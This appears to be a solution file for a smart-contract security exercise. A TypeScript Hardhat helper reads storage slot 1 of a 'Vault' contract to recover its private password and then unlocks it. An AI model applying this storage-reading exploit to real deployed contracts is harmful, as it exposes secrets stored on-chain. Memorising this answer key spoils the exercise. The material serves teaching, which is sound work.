import { web3 } from "hardhat";

const helper = async (victim: any) => {
  /* 
    Add code here that will help you pass the test
    Note: Unlock without using the string "A very strong password"
    Unlock the vault by somehow reading the private password from 
    Vault directly
  */

  // not working with ethers
  // const password = await ethers.provider.getStorageAt(
  //   victim.address,
  //   BigNumber.from(1)
  // );
  const password = await web3.eth.getStorageAt(victim.address, 1);
  await victim.unlock(password);
};

export default helper;
